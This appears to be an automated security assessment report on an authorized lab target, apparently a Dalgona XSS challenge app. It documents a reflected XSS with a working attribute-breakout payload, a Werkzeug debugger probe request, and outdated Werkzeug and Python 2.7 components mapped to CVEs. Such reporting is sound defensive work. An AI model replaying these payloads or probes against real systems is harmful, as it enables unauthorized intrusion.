# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — xss-reflected Reflected XSS via attribute-context injection in /page `solution` param](#finding-1)
    - [2. MEDIUM — vulnerable-component Outdated Werkzeug 1.0.1 (dev server) — known CVE-2023-25577 / CVE-2024-34069 / CVE-2023-23934](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life Python 2.7.18 interpreter — unsupported, unpatched (CVE-2023-24329 et al.)](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyreaqq-7rrzr0` |
| Target | http://target.local:32847/ |
| Started | 2026-06-29T05:10:17.851Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32847`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 3 medium

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [xss-reflected] Reflected XSS via attribute-context injection in /page `solution` param

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32847/

The `solution` POST parameter is reflected unescaped into the `value` attribute of an `<input>` element without HTML-encoding double quotes. Submitting `" onmouseover="alert(1)` breaks out of the attribute context and injects a live event-handler attribute into the rendered HTML, giving arbitrary JavaScript execution in any user's browser that views the response.

**Reproduction**

```
1. POST to http://target.local:32847/page with body: solution=%22+onmouseover%3D%22alert(1)
2. Observe the HTML response contains: &lt;input ... value="" onmouseover="alert(1)"&gt;
3. The injected handler executes when a user mouses over the input field.
```

**Evidence**

- Evidence `ev-mqyrl68p-i` — `artifacts/s-0002/ev-mqyrl68p-i/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

solution=test_baseline
```

Response:

```http
HTTP/1.1 200
content-length: 1024
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:15:38 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss9.css">
            <title>Dalgona - Circle</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_circle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." value="test_baseline">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqyrm9a2-k` — `artifacts/s-0002/ev-mqyrm9a2-k/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

solution=%22+onmouseover%3D%22alert(1)
```

Response:

```http
HTTP/1.1 200
content-length: 1034
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:16:28 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss9.css">
            <title>Dalgona - Circle</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_circle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." value="" onmouseover="alert(1)">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqyrn0sf-p` — `artifacts/s-0002/ev-mqyrn0sf-p/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

solution=%22+onmouseover%3D%22alert(1)
```

Response:

```http
HTTP/1.1 200
content-length: 1034
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:17:04 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss9.css">
            <title>Dalgona - Circle</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_circle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." value="" onmouseover="alert(1)">
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [vulnerable-component] Outdated Werkzeug 1.0.1 (dev server) — known CVE-2023-25577 / CVE-2024-34069 / CVE-2023-23934

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32847/

The server identifies as `Werkzeug/1.0.1 Python/2.7.18` in the HTTP `Server` response header on every response (observed via fingerprint_scan and confirmed by http_request to `/`). Werkzeug 1.0.1 (released March 2020) is many major versions behind the current 3.x line and is affected by multiple published CVEs:

• CVE-2023-25577 (Werkzeug < 2.2.3) — multipart form parsing does not bound the number of parts; a crafted multipart request causes excessive CPU/memory use → denial of service. Applies to 1.0.1. (medium)
• CVE-2024-34069 (Werkzeug < 3.0.3) — the interactive debugger can be tricked into executing on an attacker-controlled domain, enabling theft of the debugger PIN and remote code execution via the console. Requires `debug=True`. (would be high/critical if debug were on)
• CVE-2023-23934 (Werkzeug < 2.2.3) — divergent cookie-name parsing lets a "nameless" cookie (`=value`) shadow legitimately named cookies. (low)

This is a VERSION-BASED finding: the affected version was identified from the `Server` banner, not (except the debugger, see below) exploited. The operator should confirm the deployed Werkzeug build before relying on these CVE attributions.

ACTIVE CHECK PERFORMED: the Werkzeug interactive debugger was probed via `GET /?__debugger__=yes&cmd=resource&f=debugger.js` (ev-mqyrs25l-13, ev-mqyrs2wk-14). The server returned the normal application page (200, 1090 bytes) rather than the debugger JS resource, so `debug=True` is NOT enabled and CVE-2024-34069 is NOT exploitable in the current configuration. The unconditional DoS (CVE-2023-25577) and cookie-shadowing (CVE-2023-23934) issues still apply.

CONTEXT: the banner is the Werkzeug development WSGI server (`run_simple`), which upstream explicitly documents as not suitable for production exposure — recommend fronting with / migrating to a production WSGI server and upgrading Werkzeug to a supported 3.x release.

**Reproduction**

```
1. `GET http://target.local:32847/` → response header `Server: Werkzeug/1.0.1 Python/2.7.18` (ev-mqyrrz90-10, ev-mqyrrzly-11; 200, 1090 bytes). 2. Negative control `GET /verdict-nonexistent-probe-xyz` → 404, 232 bytes (ev-mqyrs0pv-12), distinct status/length. 3. Map the banner version 1.0.1 to the CVEs above. 4. Debugger active check `GET /?__debugger__=yes&cmd=resource&f=debugger.js` returned the app page, not debugger.js → debug mode off (CVE-2024-34069 not exploitable here).
```

**Evidence**

- Evidence `ev-mqyrs0pv-12` — `artifacts/_/ev-mqyrs0pv-12/`

Request:

```http
GET /verdict-nonexistent-probe-xyz HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:57 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqyrrz90-10` — `artifacts/_/ev-mqyrrz90-10/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:55 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqyrrzly-11` — `artifacts/_/ev-mqyrrzly-11/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:56 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-life Python 2.7.18 interpreter — unsupported, unpatched (CVE-2023-24329 et al.)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32847/

The `Server` response header (`Werkzeug/1.0.1 Python/2.7.18`, observed via fingerprint_scan and http_request to `/`) shows the application runs on Python 2.7.18. Python 2.7.18 (April 2020) is the FINAL Python 2 release; the Python 2 series reached end-of-life on 2020-01-01 and receives NO further security patches from upstream. Running an EOL interpreter means any vulnerability discovered after EOL remains permanently unfixed unless a distro backports it.

Relevant stdlib CVEs that are fixed only in Python 3.x and remain unpatched on stock 2.7.18 include:
• CVE-2023-24329 — `urllib.parse` blocklist bypass via a leading whitespace/control character, enabling SSRF / filter bypass where URL scheme checks are relied upon (fixed 3.11.4 / 3.10.12; no 2.7 fix).
• CVE-2021-3733 — ReDoS in `urllib.request` (AbstractBasicAuthHandler) → DoS.
• CVE-2021-4189 — `ftplib` trusts the PASV response IP, enabling SSRF to arbitrary hosts.
• CVE-2022-0391 — `urllib.parse` does not strip newline/tab control characters → request splitting / parsing confusion.

This is a VERSION-BASED finding: the interpreter version was identified from the `Server` banner, not exploited. Exploitability of the individual stdlib CVEs depends on whether the application uses the affected modules (urllib/ftplib) on attacker-influenced input — the operator should verify usage. Regardless, an EOL, unsupported language runtime is itself the core issue.

REMEDIATION: migrate the application to a supported Python 3.x release (3.11+).

**Reproduction**

```
1. `GET http://target.local:32847/` → response header `Server: Werkzeug/1.0.1 Python/2.7.18` (ev-mqyrrz90-10, ev-mqyrrzly-11; 200, 1090 bytes), revealing the Python 2.7.18 interpreter. 2. Negative control `GET /verdict-nonexistent-probe-xyz` → 404, 232 bytes (ev-mqyrs0pv-12), distinct status/length. 3. Note Python 2 EOL = 2020-01-01; 2.7.18 is the last release and is unsupported → map to the unpatched stdlib CVEs above.
```

**Evidence**

- Evidence `ev-mqyrs0pv-12` — `artifacts/_/ev-mqyrs0pv-12/`

Request:

```http
GET /verdict-nonexistent-probe-xyz HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:57 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqyrrz90-10` — `artifacts/_/ev-mqyrrz90-10/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:55 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqyrrzly-11` — `artifacts/_/ev-mqyrrzly-11/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32847
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:56 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
